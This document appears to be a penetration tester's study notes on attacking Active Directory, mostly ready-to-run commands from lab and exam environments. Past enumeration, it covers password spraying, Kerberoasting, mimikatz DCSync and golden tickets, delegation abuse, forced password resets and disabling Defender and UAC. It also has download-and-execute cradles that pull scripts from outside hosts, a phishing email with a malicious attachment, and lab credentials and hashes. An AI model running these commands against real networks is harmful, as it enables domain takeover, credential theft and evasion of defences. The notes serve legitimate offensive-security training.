# Domain Enumeration

Domain discovery, user/group/computer enumeration, trust mapping, password policy discovery, and early validation of attack paths.
This page keeps domain-first recon together; use `06 Services` for protocol-specific deep dives and `03 AD/Kerberos.md` for ticket-focused abuse.

## Active Directory General Checklist

1. Define the primary target.
2. Reference the [Pentest AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg).
3. Use SharpHound and BloodHound for enumeration.
4. Remember, **Enumeration is key;** repeat the process for each user owned.
5. Proceed to the enumeration checklist.
6. Review Kerberos-related checklists.
7. Attempt DCSync and DCShadow attacks.
8. Run Responder.
9. If a mail server is present, send an email with `config.Library-ms`.
10. Use `enum4linux` for enumeration.
11. Discover the Sysvol share from the Domain Controller.
12. After obtaining a shell with `psexec`, check permissions.
13. Perform an LDAP dump with `ldapdomaindump` and check descriptions.
14. Use `jq` to parse JSON data for interesting fields.
15. Reference [Active Directory Enumeration - Pentest Everything](https://pentesteverything.gitbook.io/pentest-everything/penetration-testing/enumeration/active-directory-enumeration) for additional techniques.
16. Recollect data with BloodHound if stuck.
17. Repeat enumeration steps—**Enumeration is key; try harder.**
18. Verify all findings and ensure no steps were missed.

## Active Directory with Credentials Checklist

1. Define your goal and act accordingly.
2. Add the Domain Controller's hostname to `/etc/hosts`.
3. Check the current user.
4. Check current user group memberships:

```bash
whoami /groups /fo list | findstr Name
```

5. Identify the Domain Controller:

```powershell
Get-NetDomain
```

6. Identify domain admins:

```bash
net group "Domain Admins" /domain
```

7. Check for domain trusts.
8. Run Responder.
9. Check for SMB null sessions.
10. Check users' domain group memberships present on the current host:

```bash
net user username /domain
```

11. Identify service accounts and hosts related to them.
12. Find who is logged on to different hosts.
13. Check local admin groups and other local groups.
14. Use `Find-LocalAdminAccess`.
15. Find users with reversible encryption.
16. Check domain admin group and other domain groups.
17. Check enterprise admin group.
18. Check Organizational Units (OUs):

```powershell
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName
```

19. Use `impacket-rpcdump` for RPC enumeration.
20. Identify the Primary Domain Controller (PDC).
21. Check for disabled accounts that may be admin.
22. Attempt DCSync and use `ldapdomaindump`.
23. Check for passwords in comments, descriptions, or other fields.
24. Parse BloodHound exports for interesting properties using `jq`:

```bash
cat domain_users.json | jq '.[] | select(.attributes.description != null and .attributes.description[0] != null) | {sAMAccountName: .attributes.sAMAccountName[0], description: .attributes.description[0]}'
```

25. Enumerate computers in the domain.
26. Discover the Sysvol share from the Domain Controller.
27. Find domain admins' sessions on different PCs.
28. Find old devices.
29. Mount all accessible shares and inspect them thoroughly.
30. Check if the current user has local admin permissions on other PCs with `Find-LocalAdminAccess`.
31. Check ACLs and ACEs for the current user:

```powershell
Find-InterestingDomainAcl | select ObjectDN, AceType
```

32. Check if the user has ACL permissions on groups.
33. Check if the user can reset passwords for other users.
34. Examine the local host thoroughly.
35. Check local admins with `Find-LocalAdminAccess`.
36. Use BloodHound, SharpHound, and RustHound for enumeration.
37. Check AD object descriptions.
38. Parse JSON data for descriptions using `jq`:

```bash
cat bloodhound_users.json | jq '.data[] | select(.Properties.description != null) | {samaccountname: .Properties.name, description: .Properties.description}'
```

39. Check local admins of Domain Controllers.
40. In BloodHound, check outbound object control of owned users.
41. Find ASREPRoastable users.
42. Request AS_REP messages with `impacket-GetNPUsers`:

```bash
impacket-GetNPUsers domain.com/username:'Password123!' -dc-ip 192.168.123.100 -request -o ./oscp.kerb
```

43. Find Kerberoastable users.
44. Enumerate SPNs with `nxc ldap`:

```bash
nxc ldap 192.168.123.0/24 -u 'username' -p 'password' --kerberoast spns.txt
```

45. Repeat enumeration steps—**Enumeration is key; try harder.**
46. Verify all findings and ensure no steps were missed.

## Active Directory without Credentials Checklist

1. Add the Domain Controller's hostname to `/etc/hosts`.
2. Enumerate users with Kerbrute:

```bash
/Tools/kerbrute_linux_amd64 userenum -d domain.com --dc 192.168.123.100 $SECLIST/Usernames/Names/names.txt
```

4. Use wordlists like [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames/tree/master/facebook-base-lists).
5. Merge wordlists to create a comprehensive `names.txt`:

```bash
cat *.txt | sort -u > allnames.txt
```

6. Request AS_REP messages:

```bash
impacket-GetNPUsers domain.com/ -usersfile adcreds.txt -dc-ip 192.168.123.100 -request -outputfile hash.hash
```

    [ASREPRoast HackTricks Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast#request-as_rep-message)

7.Continue using Kerbrute until you have the naming schema, lots of users, and service accounts. Refer to [service-accounts.txt](https://github.com/crtvrffnrt/wordlists/blob/main/service-accounts.txt).
8. Try using the username as the password.
9. Identify the Domain Controller.
10. Run Responder.
11. Use `rpcclient` for RPC enumeration:

```bash
rpcclient 192.168.123.100 -U ""
rpcclient 192.168.123.100 -U "domain.com\guest"
```

12. Use more `rpcclient` commands:

```bash
    rpcclient -U 'domain.com\guest' -c "
        srvinfo;
        enumdomusers;
        queryuserdomainsid;
        enumgroups;
        enumdomgroups;
        enumprinters;
        enumservices;
        getdompwinfo;
        lsaenumsid;
        lsaqueryinfopol;
        querydispinfo;
        enumtrustdom;
        netshareenum;
        samrlookuprids;
    " 192.168.123.100
```

13. Check all SIDs with:

```bash
:lookupsids S-1-5-80-...
```

14. Check for SMB null sessions.
15. Check for SMB guest sessions.
16. Use `nxc smb` to enumerate shares:

```bash
nxc smb 192.168.123.100 -u "a" -p "" --shares
nxc smb 192.168.123.100 -u "guest" -p "" --shares
```

17. Use `enum4linux` for additional enumeration:

```bash
enum4linux -a 192.168.123.100
```

18. Use `impacket-rpcdump` for RPC enumeration.
19. Attempt anonymous LDAP dumps with `ldapdomaindump`:

```bash
ldapdomaindump 192.168.123.100
```

20. Use `ldapsearch` for LDAP enumeration:

```bash
ldapsearch -x -h 192.168.123.100 -b "dc=domain,dc=com"
```

21. Repeat enumeration steps—**Enumeration is key; try harder.**
22. Verify all findings and ensure no steps were missed.

## Initial Enumeration

```
# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```

## LLMNR Poisoning

```
# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

# Uses CME to extract  password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
Get-Module

# Loads the Active Directory PowerShell module from a Windows-based host.
Import-Module ActiveDirectory

# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
Get-ADDomain

# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
Get-ADTrust -Filter * | select name

# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
Get-ADGroupMember -Identity "Backup Operators"
```

## Miscellanous Configurations

```
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description

# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## KERBRUTE USER ENUM? (→ kerbrute_valid.txt)

```bash
kerbrute userenum --dc <dc_ip> -d <domain> users.txt 2>/dev/null |tee kerbrute_valid.txt
```

############################################

## AD

If enumerating AD from remote WinRM or PowerShell, you may run into [Kerberos Double-Hop Issue](https://posts.slayerlabs.com/double-hop/)... To avoid it, the simplest way is to use RDP.

1. Nmap Port Scan subnet
2. Enumerate with PowerUp.ps1
3. Enumerate with WinPEAs
4. Enumerate with BloodHound
	1. PrivEsc as needed
	2. mimikatz
```
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```
1. Make users.txt
2. Use found passwords/policies/hashes
	1. cme, netexec, kerbrute

---

- Using BloodHound CE/SharpHound:
	- SharpHound for data collection to be used with BloodHound:
		- Transfer SharpHound to Target
			- `powershell -ep bypass`
			- `Import-Module .\Sharphound.ps1`
			- Begin data collection of domain data for BloodHound from the Target
				- `Get-Help Invoke-BloodHound`
				- `Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Collected Data"`
					- `-d <domain>`
				- `dir C:\Users\stephanie\Desktop\`
	- ==BloodHound== CE for Domain Enumeration:
		- From Kali:
			- `sudo systemctl start docker`
			- `sudo systemctl status docker`
			- `sudo systemctl enable docker`
			- `sudo ./bloodhound-cli install` --- Only use BloodHound Community Edition
				- [Quickstart](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
			- Log in to the Neo4j Database using creds
			- Transfer SharpHound zip file from Windows Target to Kali
			- In BloodHound GUI, go to *Administration > File Ingest > Upload Files* and Drop zip file into BloodHound's main window.
			- Analyze data (Explore):
				- **CLICK FOLDER FOR PREBUILT QUERIES!**
				- [Cyphers](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
				- Pathfinding, select a node and poke around...
				- [Object Permissions](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=genericall#genericall-rights-on-group)
```plaintext
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
> Valuable AD permission types
- If GenericAll on User, change their password and login:
	- `net user <user> <pass> /domain`
- If GenericAll on Group, add the user to the group
	- `net group "domain admins" <user> /add /domain`
- If NOT using BloodHound CE and using BloodHound (unlikely):
		- Alternative to SharpHound, run this ingestor from Kali:
			- `sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <DC_IP> -c all`
			- `sudo neo4j start`
			- Click or navigate to: [`http://localhost:7474`](http://localhost:7474/)
				- Authenticate with `neo4j:neo4j` and change the password (`neo4j1`)
			- `bloodhound`

---
If you forgot the password, you can reset it:

1. **Stop the BloodHound container** (if you're using Docker):
    `docker stop bloodhound`
2. **Start Neo4j in a way that allows password reset**:
    `docker run \   -e NEO4J_AUTH=none \   -p 7474:7474 -p 7687:7687 \   neo4j`
3. **Access Neo4j Browser** at [http://localhost:7474](http://localhost:7474) and run:
    `CALL dbms.changePassword('newpassword')`
4. **Restart your BloodHound container** with:
    `docker run -d \   -e NEO4J_AUTH=neo4j/newpassword \   -p 7474:7474 -p 7687:7687 -p 8080:8080 \   --name bloodhound \   bloodhound:latest`

## Privilege Escalation Techniques

- **[Run as System using Evil WinRM](https://malicious.link/posts/2020/run-as-system-using-evil-winrm/)**
  A detailed blog post explaining methods to escalate privileges to SYSTEM using Evil WinRM, a tool for Windows remote management exploitation.
- **[# Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)**
  There are a lot of different potatoes used to escalate privileges from Windows Service Accounts to  NT AUTHORITY/SYSTEM.

- [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato)
- [Rotten Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#rottenPotato)
- [Lonely Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#lonelyPotato)
- [Juicy Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)
- [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
- [Sweet Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)
- [Generic Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#genericPotato)
- [God Potato](https://github.com/BeichenDream/GodPotato)

## Enum

View object ACL’s

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/powerview.ps1') | IEX

Get-ObjectAcl -Identity <username>
Get-ObjectAcl -Identity <username> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

View all user objects access rights (GenericAll, WriteDACL)

```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

View all group objects access rights (GenericAll, WriteDACL)

```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Change ACL if WriteDACL is set on object

```powershell
Add-DomainObjectAcl -TargetIdentity <target username/group> -PrincipalIdentity <username> -Rights All
```

Get interesting ACL’s

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

## Unconstrained delegation

Get unconstrained delegation computers

```powershell
Get-DomainComputer -Unconstrained

-Domain domain.com (optional to enum other domains in forest)
```

View and use forwardable tickets on unconstrained host

```plaintext
privilege::debug
sekurlsa::tickets
sekurlsa::tickets /export
kerberos::ptt <filename>
C:\Tools\SysinternalsSuite\PsExec.exe \\dc01 cmd
whoami
```

Check printer spooler service active on remote host

```plaintext
dir \\dc01\pipe\spoolss
ls \\dc01\pipe\spoolss
```

Rubeus monitor for incoming tickets filtered by host (run on Unconstrained delegation host)

```plaintext
Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

Force remote host to connect to host

```plaintext
SpoolSample.exe DC01 TARGET01
```

Use ticket with Rubeus

```plaintext
Rubeus.exe ptt /ticket:<base64>
```

Force dcsync using mimikatz to get user hashes using injected ticket

```plaintext
lsadump::dcsync /domain:x.domain.com /user:x\krbtgt
lsadump::dcsync /domain:x.domain.com /user:x\administrator
```

## Constrained delegation

Get constrained delegation computers

```powershell
Get-DomainComputer -TrustedToAuth

-Domain d.com (optional to enum other domains in forest)
```

Generate a TGT for a user

```plaintext
.\Rubeus.exe asktgt /user:iissvc /domain:x.com /rc4:<hash>
```

S4U Constrained Delegation generate ticket for any domain user

```plaintext
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /ptt
```

S4U Constrained Delegation generate ticket for any domain user for a alternative service on the same host

```plaintext
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.domain.com:1433 /altservice:CIFS /ptt
```

PowerShell Remotely load rubeus

```plaintext
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("purge".Split())
[Rubeus.Program]::Main("s4u /user:host$ /rc4:x /impersonateuser:administrator /msdsspn:cifs/host$ /ptt".Split())
ls \\host\c$
```

## Resource-Based Constrained Delegation

Get GenericWrite computers

```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Get machine quota in the domain

```powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

Add computer using PowerMad

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/Powermad.ps1') | IEX

New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of ‘server’ object to newly created machine

```powershell
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity server | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Use computer account to generate ticket

```plaintext
.\Rubeus.exe s4u /user:myComputer$ /rc4:x /impersonateuser:administrator /msdsspn:CIFS/dc01.domain.com /ptt
```

Add computer using impacket

```plaintext
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -k -no-pass -computer-name 'rbcd$' -computer-pass 'Password12345' -dc-ip 1.1.1.1 DOMAIN/user -dc-host dc.domain.com
```

Update msDS-AllowedToActOnBehalfOfOtherIdentity of ‘server’ object to newly created machine using impacket

```plaintext
python3 rbcd.py -delegate-to 'HOST$' -delegate-from 'rbcd$' -action write -k -no-pass DOMAIN/user -debug
```

Get service ticket using impacket

```plaintext
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn CIFS/HOST.DOMAIN.COM -impersonate 'Administrator' -dc-ip 1.1.1.1 'DOMAIN/rbcd$:Password12345'
```

## Kerberoasting

PowerShell load assembly Rubeus from base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt

$a = Get-Content .\rubeus.txt
$assem = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($a))
```

Export all available tickets

```plaintext
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```

## Forest enum

Get trusted domains

```powershell
nltest /trusted_domains

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

Get-DomainTrust -API [-Domain anotherdomaininforest.com] (WIN32)

Get-DomainTrust [-Domain anotherdomaininforest.com] (LDAP)
```

Enumerate users in a trusted domain / forest with PowerView

```powershell
Get-DomainUser -Domain domain.com
```

Enumerate groups in a trusted domain / forest with PowerView

```powershell
Get-DomainGroup -Domain domain.com
```

Get users in Enterprise Admins group of root domain

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain domain.com
```

## Forest compromise

Dump KRBTGT

```plaintext
lsadump::dcsync /domain:d.x.com /user:d\krbtgt
```

Generate domain SID

```powershell
Get-DomainSID -Domain d.x.com
```

Generate golden ticket with ExtraSides (obtaining Enterprise Admins role in trusted domain) <destination domain SID with "-519" appended>

```plaintext
kerberos::golden /user:h4x /domain:domain.com /sid:S-1-5x /krbtgt:x /sids:S-1-5-21-x-519 /ptt
```

## Beyond forest enum

Get forest trusts

```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

Get-ForestTrust
```

Get trusts to domains in other forest

```powershell
Get-DomainTrust -Domain d.com

Get-DomainTrustMapping
```

Get users in other forest

```powershell
Get-DomainUser -Domain d.com
```

Get group members of a group in another forest

```powershell
Get-DomainForeignGroupMember -Domain d.com
```

Enable SID history (on target forest DC)

```plaintext
netdom trust d2.com /d:d1.com /enablesidhistory:yes
```

---

## AD / Enumeration

---

Enumerate Windows with HostRecon

```powershell
(new-object system.net.webclient).downloadstring('http://192.168.1.1/HostRecon.ps1') | IEX

Invoke-HostRecon
```

Check if PPL Protection is enabled

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

Check if AppLocker is enabled

```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

Check PowerShell execution context

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Get loaded DLL’s

```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

---

## AD / Other

---

View current Integrity

Rubeus Password to hash

```plaintext
.\Rubeus.exe hash /password:lab
```

Run CMD as other usr

```plaintext
runas /user:administrator@d.com cmd
```

Nmap through Proxychains

```plaintext
proxychains nmap -sT -Pn 192.168.1.1
```

Get NTLM from krb5.keytab file

```plaintext
./keytabextract.py krb5.keytab
```

Search fileshares

```powershell
Invoke-ShareFinder -Verbose -Domain d
Find-DomainShare -CheckShareAccess
```

Find machines current user has local admin

View local admins on computer

```powershell
Find-GPOComputerAdmin –Computername <ComputerName>
```

List GPO’s

Reset user PW through PowerView

```powershell
Set-DomainUserPassword -Identity User -Verbose
```

Send mail with swaks

```shell
swaks --to w@domain.com --server 192.168.1.1 --body "Hello" --header "Subject: Issues"  --from hacker@domain.com

sudo swaks -t jim@relia.com --from maildmz@relia.com --attach config.Library-ms --server 192.168.243.189 --body "Attached is the link to the problematic email." --header "Subject: Urgent Mail Issue" --auth-user 'maildmz@relia.com' --auth-password 'DPuBT9tGCBrTbR' --suppress-data
```

PowerSharpPack

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
PowerSharpPack -Tokenvator -Command "getsystem powershell.exe"
```

List of testing tools
```
arsenal
```

## secretsdump.py Dump mscash - Cached Domain Credentials

```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

## lookupsid.py lookupsid Get DomainSID

```
impacket-lookupsid -domain-sids <domain>/'<username>':'<password>'@<dc_host> 0
```

## impacket add a computer

```
addcomputer.py -computer-name '<computername>$' -computer-pass '<computer_password>' -dc-host <dc_ip> '<domain>/<username>:>user_password'
```

## PowerView

https://powersploit.readthedocs.io/en/stable/Recon/README/

## Recon Get Default Domain Policy

```cmd
powershell -ep bypass
. .\PowerView.ps1
Get-GPO -Name "Default Domain Policy"

# Use the Guid (ID) to see what we can do with our user
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName <our user>

# If you can GPO Edit, Modify, or Delete... Use SharpGPOAbuse!
```

## Recon Get Groups

```
Get-DomainGroup -domain <domain> | select samaccountname
```

## Recon Get GroupMembers

```
Get-DomainGroupMember -domain <domain> -Identity <identity> | select MemberName
```

## Recon Find groups's ACEs on current user

```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```

## Recon Find user's ACEs on current user

```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```

## Recon Find computer's ACEs on current user

```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | select Identity, ObjectDN, AceType, ActiveDirectoryRights
```

## Recon Get SPN

```
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```

## PowerView Add user to domain group

```
Add-DomainGroupMember -Identity '<groupname>' -Members '<username>'
```

## PowerView Set SPN

```
Set-DomainObject -Credential $creds -Identity <account> -Set @{serviceprincipalname="fake/NOTHING"}
```

## ACEs ForceChangePassword (PowerView)

```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Verbose
```

## ACEs ForceChangePassword (On Kali, with password)

https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
```
net rpc password <TargetUser> -U <domain>/<ControlledUser>%<Password> -S <DC>
```

## Add User to a group

```bash
bloodyAD -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember Infrastructure alfred
```

## Reset Users password

```bash
bloodyAD --host $IP -d tombwatcher.htb -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc set password 'SAM' 'newP@ssword2022'
```

## ACEs ForceChangePassword (On Kali, with hash)

```
pth-net rpc password <TargetUser> -U <domain>/<ControlledUser>%ffffffffffffffffffffffffffffffff:<nthash> -S <DC>
```

## ACEs add Rights

```
Add-DomainObjectAcl -TargetIdentity <GroupName> -PrincipalIdentity <Account> -Rights All
```

## Netexec

**IF LOCAL**
```bash
nxc rdp 192.168.243.191 -u 'dmzadmin' -p 'SlimGodhoodMope' --local-auth
```

## AVOID LOCKOUTS

```
nxc rdp targets.txt -u users.txt -p pass.txt --ufail-limit 3 --gfail-limit 10 --continue-on-success
```

## check machine account quota

```
nxc ldap <target> -u <username> -p <password> -d <domain> -M MAQ
```
